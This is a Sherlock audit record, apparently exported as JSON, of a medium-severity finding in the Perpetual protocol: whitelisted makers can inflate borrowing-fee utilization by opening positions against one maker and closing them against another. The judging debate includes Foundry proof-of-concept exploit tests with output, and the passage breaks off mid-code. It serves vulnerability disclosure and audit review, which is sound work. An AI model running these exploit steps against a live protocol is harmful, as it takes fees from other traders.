{
  "Title": "M-10: Borrow fees can be arbitrarily increased without the maker providing any value",
  "Content": "# Issue M-10: Borrow fees can be arbitrarily increased without the maker providing any value \n\nSource: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nIllIllI\n## Summary\n\nThe SpotHedgeBaseMaker LPs can maximize their LP returns by closing their trades against other whitelisted makers\n\n\n## Vulnerability Detail\n\nThe [whitelisted makers](https://perp.notion.site/Borrowing-Fee-Spec-v0-8-0-22ade259889b4c30b59762d582b4336d), which the SpotHedgeBaseMaker and the OracleMaker are, `[c]an receive borrowing fee based on [their] utilization ratio` and `[d]onâ€™t need to pay borrowing fee` themselves. The borrowing fee is meant to be compensation for providing liquidity to the market, but makers like the SpotHedgeBaseMaker, which are able to hedge their position risk, can arbitrarily increase their utilization ratio by opening positions against the OracleMaker, and immediately closing them against the SpotHedgeBaseMaker, maximizing their fees without having to provide liquidity over time.\n\nAn attacker can choose a specific market direction, then monitor the utilization of the OracleMaker. Any time the OracleMaker's utilization is flat, the attacker would open a position in the chosen market direction against the OracleMaker (to minimize the dynamic premium), then immediately close the position by offsetting it with a taker order against the SpotHedgeBaseMaker. The only risk the attacker has to take is holding the position for the approximately ~2 second optimism block time, until they're able to offset the position using the ClearingHouse to interact directly with the SpotHedgeBaseMaker.\n\n## Impact\n\nValue extraction in the form of excessive fees, at the expense of traders on the other side of the chosen position direction.\n\n\n## Code Snippet\n\nUtilization does not take into account whether the taker is reducing their position, only that the maker is increasing theirs:\n```solidity\n// File: src/borrowingFee/LibBorrowingFee.sol : LibBorrowingFee.updateReceiverUtilRatio()   #1\n\n40            /// spec: global_ratio = sum(local_ratio * local_open_notional) / total_receiver_open_notional\n41            /// define factor = local_ratio * local_open_notional; global_ratio = sum(factor) / total_receiver_open_notional\n42            /// we only know 1 local diff at a time, thus splitting factor to known_factor and other_factors\n43            /// a. old_global_ratio = (old_factor + sum(other_factors)) / old_total_open_notional\n44            /// b. new_global_ratio = (new_factor + sum(other_factors)) / new_total_open_notional\n45            /// every numbers are known except new_global_ratio. sum(other_factors) remains the same between old and new\n46            /// expansion formula a: sum(other_factors) = old_global_ratio * old_total_open_notional - old_factor\n47            /// replace sum(other_factors) in formula b:\n48            /// new_global_ratio = (new_factor + old_global_ratio * old_total_open_notional - old_factor) / new_total_open_notional\n49            uint256 oldUtilRatioFactor = self.utilRatioFactorMap[receiver];\n50 @>         uint256 newTotalReceiverOpenNotional = self.totalReceiverOpenNotional;\n51            uint256 oldUtilRatio = self.utilRatio;\n52            uint256 newUtilRatio = 0;\n53            if (newTotalReceiverOpenNotional > 0) {\n54                // round up the result to prevent from subtraction underflow in next calculation\n55 @>             newUtilRatio = FixedPointMathLib.divUp(\n56                    oldUtilRatio * self.lastTotalReceiverOpenNotional + newUtilRatioFactor - oldUtilRatioFactor,\n57                    newTotalReceiverOpenNotional\n58                );\n59:           }   \n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/LibBorrowingFee.sol#L40-L59\n\nand [whitelisted makers](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/BorrowingFee.sol#L299-L303) never have to pay any fee:\n```solidity\n// File: src/borrowingFee/BorrowingFee.sol : BorrowingFee.getPendingFee()   #2\n\n165        function getPendingFee(uint256 marketId, address trader) external view override returns (int256) {\n166 @>         if (_isReceiver(marketId, trader)) {\n167                return _getPendingReceiverFee(marketId, trader);\n168            }\n169            return _getPendingPayerFee(marketId, trader);\n170:       }\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/BorrowingFee.sol#L165-L170\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nThere is no incentive to reduce utilization, and I don't see a good solution that doesn't involve the makers having to actively re-balance their positions, e.g. force makers to also have to pay the fee, and only pay the fee to the side that has the largest net non-maker open opposite position\n\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium/Low - Attacker's position may be closed with some losses due to slippage closing the position against SpotHedgeBaseMaker\n\n\n\n**42bchen**\n\nBy doing this, the attacker will risk losing money because he needs to relay the position to our relayer, and he can't guarantee that this operation is profitable. Also, arbitrage between maker and maker is expected in our system.\n\n**IllIllI000**\n\n@42bchen the position only has to be open for one block so the position risk is small. The attacker gains value from the LP borrow fees over time that accrue well past the point at which they close the trade, not from the position itself. Every user on one side is affected by the higher fees, so even if the whole trade is a loss for the attacker, they've still gotten all other users to pay higher fees, which is a loss of funds for them. Also, [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133) one was marked as a valid high, and has the same gap risk\n\n**42bchen**\n\n> @42bchen the position only has to be open for one block so the position risk is small. The attacker gains value from the LP borrow fees over time that accrue well past the point at which they close the trade, not from the position itself. Every user on one side is affected by the higher fees, so even if the whole trade is a loss for the attacker, they've still gotten all other users to pay higher fees, which is a loss of funds for them. Also, [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133) one was marked as a valid high, and has the same gap risk\n\nupdate to confirmed, and we think using whitelistLp (only us) can decrease the incentive of attackers to do that, not yet figured out a better way (or easy way) to handle this issue, if you have any suggestions for solving this, please let us know, thank you ðŸ™\n\n**nirohgo**\n\nEscalate\nShould be Invalid.\n\nThis attack in unrealistic and will never be profitable. Here is why:\n\n1. The attack has the cost of negative PnL due to price difference between Oracle Maker (Pyth price at best) and SpotHedgeBaseMaker (Uniswap slippage). The bigger the investment in skewing the borrow rate, the higher the cost.\n2. skewing the utilization rate on Oracle Maker also skews the Funding Rate (more extremely since funding rate is affected non-linearly). This will cause market forces to rebalance the Oracle Maker (thus bringing its utilization rate back down) probably within minutes, and surely no longer than a day. \n3. The cost of attack is order of magnitudes higher then the additional fees over the period of time it has effect. For example: \nUnder these assumptions:  \nA. Uniswap Pool base Liquidity 1000 Eth  \nB. Oracle maker Liquidity: 1M$  \nC. SpotHedgeBaseMaker Liquidity: 1M$  \nD. MinMarginRatio: 100%  \nE. 100,000 USD open notional (that pays borrow fees) in the system.  \nF. Borrow Fees (unitization rates) are rebalanced within 24 hours.  \nG. max borrow fee per year: ~30% (0.00000001 per second).\nUnder the above assumptions the maximum amount that can be used to push the utilization rate is 1M$.  \nThe borrow fees gains from pushing utilization rates to the maximum over a day are at most $86.4\nThe slippage loss from opening and closing the positions that push utilization rate is ~$318000\nEven if we stretch some of the assumptions (i.e. less slippage on uniswap, more open notional) the attack is not anywhere near profitable.\n\n4. There are other hidden assumptions here, such as that the two makers liquidity is similar (otherwise you can't push utilization rate of both makers to the max while staying neutral) but I believe the above is sufficient to make the point.\n\n**sherlock-admin2**\n\n> Escalate\n> Should be Invalid.\n> \n> This attack in unrealistic and will never be profitable. Here is why:\n> \n> 1. The attack has the cost of negative PnL due to price difference between Oracle Maker (Pyth price at best) and SpotHedgeBaseMaker (Uniswap slippage). The bigger the investment in skewing the borrow rate, the higher the cost.\n> 2. skewing the utilization rate on Oracle Maker also skews the Funding Rate (more extremely since funding rate is affected non-linearly). This will cause market forces to rebalance the Oracle Maker (thus bringing its utilization rate back down) probably within minutes, and surely no longer than a day. \n> 3. The cost of attack is order of magnitudes higher then the additional fees over the period of time it has effect. For example: \n> Under these assumptions:  \n> A. Uniswap Pool base Liquidity 1000 Eth  \n> B. Oracle maker Liquidity: 1M$  \n> C. SpotHedgeBaseMaker Liquidity: 1M$  \n> D. MinMarginRatio: 100%  \n> E. 100,000 USD open notional (that pays borrow fees) in the system.  \n> F. Borrow Fees (unitization rates) are rebalanced within 24 hours.  \n> G. max borrow fee per year: ~30% (0.00000001 per second).\n> Under the above assumptions the maximum amount that can be used to push the utilization rate is 1M$.  \n> The borrow fees gains from pushing utilization rates to the maximum over a day are at most $86.4\n> The slippage loss from opening and closing the positions that push utilization rate is ~$318000\n> Even if we stretch some of the assumptions (i.e. less slippage on uniswap, more open notional) the attack is not anywhere near profitable.\n> \n> 4. There are other hidden assumptions here, such as that the two makers liquidity is similar (otherwise you can't push utilization rate of both makers to the max while staying neutral) but I believe the above is sufficient to make the point.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IllIllI000**\n\n1. Most attacks have some cost, so that's not a good reason to invalidate an issue. This attack can be done over time so as to minimize the impact on the uniswap pool. There is a profit to be had here as is described above but even if there weren't, Sherlock rules don't require a profit if other users get a loss, and extra unwarranted borrow fees are a definite loss to other users.\n2. The escalating watson seems to have misunderstood the attack. They write `This will cause market forces to re-balance the Oracle Maker (thus bringing its utilization rate back down) probably within minutes, and surely no longer than a day.` but the second paragraph of the `Vulnerability Detail` section describes that this is the desired behavior, because the attack is for the benefit of the SHBM LPs, _not_ the OM LPs\n\n**nirohgo**\n\n> 1. Most attacks have some cost, so that's not a good reason to invalidate an issue. This attack can be done over time so as to minimize the impact on the uniswap pool. There is a profit to be had here as is described above but even if there weren't, Sherlock rules don't require a profit if other users get a loss, and extra unwarranted borrow fees are a definite loss to other users.\n\nBe that as it may, an attack that spends $318,000 to cause $86 loss does not count as a feasible attack/valid medium.\n\n> The escalating watson seems to have misunderstood the attack. They write This will cause market forces to re-balance the Oracle Maker (thus bringing its utilization rate back down) probably within minutes, and surely no longer than a day. but the second paragraph of the Vulnerability Detail section describes that this is the desired behavior, because the attack is for the benefit of the SHBM LPs, not the OM LPs\n\nI don't think I misunderstood the attack. The borrowing fee rate is calculated based on the **overall utilization rate** of all Receivers (both the Oracle Maker and SHBM). What I meant is that at least half of the fabricated utilization rate that affects the fee rate (the part that's on the OM side) won't last long. In any event, my calculation of the gains was based on the attack effects lasting a full day. By then the utilization rate is expected re-balance on both makers (if borrowing rate is exceptionally high, either more LPs will enter, or positions will be closed). The point is that this is not a one-block attack. For it to feasible, the effect of the fabricated utilization need to last for a very long time, which won't happen.\n\n\n\n**IllIllI000**\n\n> Be that as it may, an attack that spends $318,000 to cause $86 loss does not count as a feasible attack/valid medium.\n\n> I don't think I misunderstood the attack\n\nNot sure where you're getting the arbitrary number of 318000 as the cost, when the position is only open for ~2 seconds and is only repeatedly done when there's liquidity. Also, 'expected to' sounds like a big assumption, when the attacker is actively pushing in one direction\n\n**nevillehuang**\n\n@IllIllI000 Could you provide a scenario/PoC to demonstrate the relative loss here so I can verify?\n\n**IllIllI000**\n\n@nevillehuang This is a slight modification of nirohgo's POC for https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\n\ncontract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        //PARAMETERS SETUP\n\n        //fee setup\n        //funding fee configs (taken from team tests) \n        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n\n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        \n\n        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage\n        deal(address(baseToken), spotLp, 10000e9, true);\n        deal(address(collateralToken), spotLp, 20000000e6, true);\n        vm.startPrank(spotLp);\n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 3000,\n                tickLower: -887220,\n                tickUpper: 887220,\n                amount0Desired: collateralToken.balanceOf(spotLp),\n                amount1Desired: baseToken.balanceOf(spotLp),\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n\n        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n\n    function testBorrowingFeePOC() public {\n       \n\n        //deposit 5M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 5000000*1e6;\n       _deposit(marketId, exploiter, startQuote);\n       console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($4M)\n       vm.startPrank(makerLp);\n       deal(address(baseToken), makerLp, 2000*1e9, true);\n       baseToken.approve(address(maker), type(uint256).max);\n       maker.deposit(2000*1e9);\n\n       //initial oracle maker deposit: $2M (1000 base tokens)\n       deal(address(collateralToken), makerLp, 2000000*1e6, true); \n       collateralToken.approve(address(oracle_maker), type(uint256).max);\n       oracle_maker.deposit(2000000*1e6);\n       vm.stopPrank();\n\n       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n       _deposit(marketId, address(maker), 2000000*1e6);\n\n       int256 exploiterPosSizeStart = vault.getPositionSize(marketId,address(exploiter));\n       console.logInt(exploiterPosSizeStart);\n\n       //Exploiter opens -1 base tokens long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        console.log(\"Utilization after short (long, short):\");\n        (uint256 utilLong, uint256 utilShort) = borrowingFee.getUtilRatio(marketId);\n        console.log(utilLong, utilShort);\n\n        //move to next block\n        vm.warp(block.timestamp + 2 seconds);\n\n        //Exploiter closes the short against the SHBM to increase the ratio\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        (posBase,openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 1 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        //exploiter withdraws entirely\n        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));\n        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));\n        int256 marg = stDec-upDec;\n        uint256 margAbs = marg.abs();\n        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n        vault.transferMarginToFund(marketId,toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n        vm.stopPrank();\n\n       int256 exploiterPosSizeFinish = vault.getPositionSize(marketId,address(exploiter));\n       console.logInt(exploiterPosSizeFinish);\n\n        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        console.log(\"Exploiter Quote balance at End: %s\", finalQuoteBalance);\n\n        (uint256 utilLong2, uint256 utilShort2) = borrowingFee.getUtilRatio(marketId);\n        console.log(utilLong2, utilShort2);\n    }\n}\n```\n\noutput:\n```text\n  Exploiter Quote balance at Start: 5000000000000\n  0\n  Utilization after short (long, short):\n  1000000000000000 0\n  0\n  Exploiter Quote balance at End: 4999993607598\n  1000000000000000 995908769461738\n```\nSo the attacker only had to spend 0.000128% in order to change the short utilization ratio from 0 to 995908769461738, with only one Eth. Note that the attacker no longer has any open position and, as is outlined in the vulnerability description, they can do this repeatedly in small amounts in order to increase the ratio arbitrarily, without incurring slippage in the uniswap pool, and they can be one of the SHMB's LPs in order to profit on this undeserved ratio, in the form of borrow fees, where the utilization ratio for the LP is [directly proportional](https://perp.notion.site/Borrowing-Fee-Spec-v0-8-0-22ade259889b4c30b59762d582b4336d) (`Can receive borrowing fee based on its utilization ratio`) to what percentage of the fees they're paid.\n\nAs is mentioned [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2041457466) if #133 is High, this one should be too\n\n**nirohgo**\n\n@nevillehuang . This POC proves nothing. This Watson keeps trying to pin this finding to #133 but they are essentially different.\nThe difference is that funding fee changes exponentially with utilization, while borrowing fee changes linearly up to max borrowing fee. Because of that, an attack that forces funding fee to the max can be profitable within a couple of blocks (as in #133) but an attack that tries to use the borrowing fee can not. All this POC shows is that an increase in utilization causes an increase in borrowing fee, not that that borrowing fee increase can get anywhere close to the cost of attack of make any meaningful damage in a reasonable timeframe.\n\n**IllIllI000**\n\nOne is exponential, one is linear. However, once the attacker has skewed the ratio, there's no way for the admin to do anything about it, without losing the fees themselves.\n\n**nirohgo**\n\nThe point is, how fast can the attacker make a large enough gain to cover the cost of the attack (or just inflict meaningful damage) since both rates are applied per second. In both cases the attackers create a skew that can not be held for a long time, market forces will balance it over time. But with funding rate the skew can have enough of an effect even within one block while a skew in borrowing fee will take a long time to accrue enough value, and by the time it does, the effect will be gone.\n\n**IllIllI000**\n\n1. Do you agree that eventually the fees will cover the 0.000128% cost? 2. Even if it takes a while to cover the attacker's costs, _everyone_ is _immediately_ paying these fees (a loss for them)\n\n**nirohgo**\n\n> 1. Do you agree that eventually the fees will cover the 0.000128% cost? 2. Even if it takes a while to cover the attacker's costs, _everyone_ is _immediately_ paying these fees (a loss for them)\n\nNot really. Let's take the POC you provided. If you assume there's $1,000,000 in positions that pay borrowing fee, the effect of your 1 Eth \"attack\" on the fees will add only 30 cents per day in fees. that means it will take 6666 days for these fees to cover the attack. By then whatever effect your attack had on the utilization rate/borrowing fee will have been long gone.\n\n**IllIllI000**\n\n`//borrowing fee 0.00000001 per second as in team tests` and 0.00000001 * $1,000,000 * 86400 secs/day = $864 per day paid by the position holders, for no benefit. And I'm not sure why you're counting days to cover $2k, nor where $0.30/day is coming from, when the attacker did not lose $2k - they lost $0.26\n\n**nevillehuang**\n\nBased on the discussion above, seems like some makers can profit off of other whitelisted makers for a material amount of funds. @IllIllI000 The numerical impact shown in #133 seems to be significantly higher than this issue here though, why do you think it should be high?\n\n**nirohgo**\n\n> `//borrowing fee 0.00000001 per second as in team tests` and 0.00000001 * $1,000,000 * 86400 secs/day = $864 per day paid by the position holders, for no benefit. And I'm not sure why you're counting days to cover $2k, nor where $0.30/day is coming from, when the attacker did not lose $2k - they lost $0.26\n\nYou're wrong. 0.00000001 per second is the maximum borrowing fee. The difference in fee caused by the attack is 30 cents per day. The cost of the attack is $7 (compare quote balance at end to start). to 21 days to cover the cost. Doesn't matter much because the effect is miniscule.\n\n> some makers can profit off of other whitelisted makers for a material amount of funds  \n\n@nevillehuang do explain where got that some makers can profit off of other whitelisted makers for a material amount of funds?\n\n**WangSecurity**\n\n@nirohgo can you explain where you get the 30 cents per day from? As of now, your calculations have changes from one message to another and I can't really see where the calculations come from. I'm inclined towards rejecting the escalation and leaving the issue as it is due to the PoC provided the @IllIllI000 and [this comment](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126#issuecomment-2045799032)\n\n**nirohgo**\n\n> @nirohgo can you explain where you get the 30 cents per day from? As of now, your calculations have changes from one message to another and I can't really see where the calculations come from. I'm inclined towards rejecting the escalation and leaving the issue as it is due to the PoC provided the @IllIllI000 and [this comment](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126#issuecomment-2045799032)\n\n@WangSecurity my numbers are consistent. \n\nThe 30 cents per day are based on the POC provided by the Watson, which tried to show that the attack is plausible when using small amounts (1 Eth).\n\nTo see this, add the following lines at the end of the POC function code:\n```solidity\n //added position to simulate the acumulated borrowing fee over a day\n_deposit(marketId, taker, 1000000*1e6);\nvm.prank(taker);\n clearingHouse.openPosition(\n    IClearingHouse.OpenPositionParams({\n        marketId: marketId,\n        maker: address(maker),\n        isBaseToQuote: true,\n        isExactInput: true,\n        amount: 500 * 1e18,\n        oppositeAmountBound:0,\n        deadline: block.timestamp,\n        makerData: \"\"\n    })\n);\n\nvm.warp(block.timestamp+1 days);\n\nconsole.log(\"accumulated Borrowing Fee in a day (USD, 18 decimals):\");\nint256 bfee = borrowingFee.getPendingFee(marketId,taker);\nconsole.logInt(bfee);\n```\nThis code shows how much borrowing fee is accumulated over a day when there are $1,000,000 of positions paying borrowing fee. Run the test once as is (and take note of accumulated Borrowing Fee), then comment out the attack code(starting at ` vm.startPrank(exploiter);` until the end at `vault.withdraw(vault.getFund(exploiter));\n        vm.stopPrank();` and run again. The difference between the accumulated borrowing fee with and without the attack is ~0.29*10^18 or roughly 30 cents. \n\n\n\n\n\n\n\n**nirohgo**\n\nBTW @WangSecurity  here is how I got to the numbers in my original scenario (showing that the attack is not feasible with large amounts):\n> Under these assumptions:\nA. Uniswap Pool base Liquidity 1000 Eth\nB. Oracle maker Liquidity: 1M$\nC. SpotHedgeBaseMaker Liquidity: 1M$\nD. MinMarginRatio: 100%\nE. 100,000 USD open notional (that pays borrow fees) in the system.\nF. Borrow Fees (unitization rates) are rebalanced within 24 hours.\nG. max borrow fee per year: ~30% (0.00000001 per second).\nUnder the above assumptions the maximum amount that can be used to push the utilization rate is 1M$.\nThe borrow fees gains from pushing utilization rates to the maximum over a day are at most $86.4\nThe slippage loss from opening and closing the positions that push utilization rate is ~$318000\n\nThis is based on the following POC:\n1. In SpotHedgeBaseMakerForkSetup.sol replace lines 81,82 with:\n```solidity\ndeal(address(baseToken), spotLp, 1000e9, true);\ndeal(address(collateralToken), spotLp, 2000000e6, true);\n```\n(setting 1000 Eth base liquidity in Uniswap Pool)\n\n2. In SpotHedgeBaseMakerForkSetup.sol replace lines 150- 153 with:\n```solidity\ndeal(address(baseToken), address(makerLp), 500e9, true);\nvm.startPrank(makerLp);\nbaseToken.approve(address(maker), type(uint256).max);\nmaker.deposit(500e9);\n```\n(setting initial SpotHedgeBaseMaker liquidity to $1M)\n\n3. Add the following code to a test.sol file under perp-contract-v3/test/spotHedgeMaker/ : \n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\n// forge test --match-test testSandwich -vv\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\nimport { IUniswapV3PoolState } from \"../../src/external/uniswap-v3-core/contracts/interfaces/pool/IUniswapV3PoolState.sol\";\n\ncontract borrowFeePOC is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether);\n        oracle_maker.setValidSender(taker,true);\n        oracle_maker.setValidSender(exploiter,true);\n\n        //initial oracle maker liquidity\n        vm.startPrank(makerLp);\n         deal(address(collateralToken), makerLp,1000000*1e6, true);\n         collateralToken.approve(address(oracle_maker), type(uint256).max);\n        oracle_maker.deposit(1000000*1e6);\n        vm.stopPrank();\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n    function testBorrowRateIssue() public {\n        //set max borrow rate\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        oracle_maker.setMinMarginRatio(1 ether);\n        maker.setMinMarginRatio(1 ether);\n        \n\n        //inititalize taker/exploiter with $10M each\n        _deposit(marketId, taker, 10000000 * 1e6);\n        _deposit(marketId, exploiter, 10000000 * 1e6);\n\n        console.log(\"Exploiter Margin at start: \");\n        int256 expMargStart = vault.getMargin(marketId,address(exploiter));\n        console.logInt(expMargStart);\n\n        // exploiter opens largest posible position on OM to maximize borrowing fee ($1M in this case), \n        //and a counter position of same size on SHBM.\n       vm.prank(exploiter);\n        (int256 pb, int256 pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 500 * 1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        vm.prank(exploiter);\n        ( pb,  pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: exploiterPosSize.abs(),\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        console.log(\"Exploiter Margin at end: \");\n        int256 expMargEnd = vault.getMargin(marketId,address(exploiter));\n        console.logInt(expMargEnd);\n\n\n        //create taker position to represent $100,000 utility paying the bloated borrowing fee\n        //for a day\n        vm.startPrank(taker);\n        (  pb,    pq) = clearingHouse.op",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/219",
  "Code": [
    {
      "filename": "perp-contract-v3/src/borrowingFee/LibBorrowingFee.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport { SafeCast } from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport { FixedPointMathLib } from \"solady/src/utils/FixedPointMathLib.sol\";\nimport { LibFeeGrowthGlobal } from \"./LibFeeGrowthGlobal.sol\";\nimport { BorrowingFeeState, FeeGrowthGlobal } from \"./BorrowingFeeStruct.sol\";\nimport { LibLugiaMath } from \"../common/LugiaMath.sol\";\nimport { LibError } from \"../common/LibError.sol\";\nimport { WAD } from \"../common/LibConstant.sol\";\n\n/// @dev https://whimsical.com/borrowing-fee-T6auYFHVctGSXNGG1KH4h5\nlibrary LibBorrowingFee {\n    using SafeCast for *;\n    using FixedPointMathLib for uint256;\n    using FixedPointMathLib for int256;\n    using LibLugiaMath for uint256;\n    using LibFeeGrowthGlobal for FeeGrowthGlobal;\n    using LibBorrowingFee for BorrowingFeeState;\n\n    //\n    // INTERNAL\n    //\n\n    function addPayerOpenNotional(BorrowingFeeState storage self, int256 payerOpenNotionalDelta) internal {\n        self.totalPayerOpenNotional = self.totalPayerOpenNotional.applyDelta(payerOpenNotionalDelta);\n    }\n\n    function addReceiverOpenNotional(BorrowingFeeState storage self, int256 receiverOpenNotionalDelta) internal {\n        // save the last totalReceiverOpenNotional for utilRatio calculation\n        self.lastTotalReceiverOpenNotional = self.totalReceiverOpenNotional;\n        self.totalReceiverOpenNotional = self.totalReceiverOpenNotional.applyDelta(receiverOpenNotionalDelta);\n    }\n\n    function updateReceiverUtilRatio(\n        BorrowingFeeState storage self,\n        address receiver,\n        uint256 newUtilRatioFactor\n    ) internal {\n        /// spec: global_ratio = sum(local_ratio * local_open_notional) / total_receiver_open_notional\n        /// define factor = local_ratio * local_open_notional; global_ratio = sum(factor) / total_receiver_open_notional\n        /// we only know 1 local diff at a time, thus splitting factor to known_factor and other_factors\n        /// a. old_global_ratio = (old_factor + sum(other_factors)) / old_total_open_notional\n        /// b. new_global_ratio = (new_factor + sum(other_factors)) / new_total_open_notional\n        /// every numbers are known except new_global_ratio. sum(other_factors) remains the same between old and new\n        /// expansion formula a: sum(other_factors) = old_global_ratio * old_total_open_notional - old_factor\n        /// replace sum(other_factors) in formula b:\n        /// new_global_ratio = (new_factor + old_global_ratio * old_total_open_notional - old_factor) / new_total_open_notional\n        uint256 oldUtilRatioFactor = self.utilRatioFactorMap[receiver];\n        uint256 newTotalReceiverOpenNotional = self.totalReceiverOpenNotional;\n        uint256 oldUtilRatio = self.utilRatio;\n        uint256 newUtilRatio = 0;\n        if (newTotalReceiverOpenNotional > 0) {\n            // round up the result to prevent from subtraction underflow in next calculation\n            newUtilRatio = FixedPointMathLib.divUp(\n                oldUtilRatio * self.lastTotalReceiverOpenNotional + newUtilRatioFactor - oldUtilRatioFactor,\n                newTotalReceiverOpenNotional\n            );\n        }\n\n        // it could be more than 100% due to rounding error from divRoundUp\n        self.utilRatio = newUtilRatio > WAD ? WAD : newUtilRatio;\n        self.utilRatioFactorMap[receiver] = newUtilRatioFactor;\n        // sync lastTotalReceiverOpenNotional to totalReceiverOpenNotional after utilRatio is updated\n        self.lastTotalReceiverOpenNotional = newTotalReceiverOpenNotional;\n    }\n\n    /// @notice\n    /// receiverFeeGrowthGlobal: how much fee receiver receives per receiverâ€™s openNotional since beginning.\n    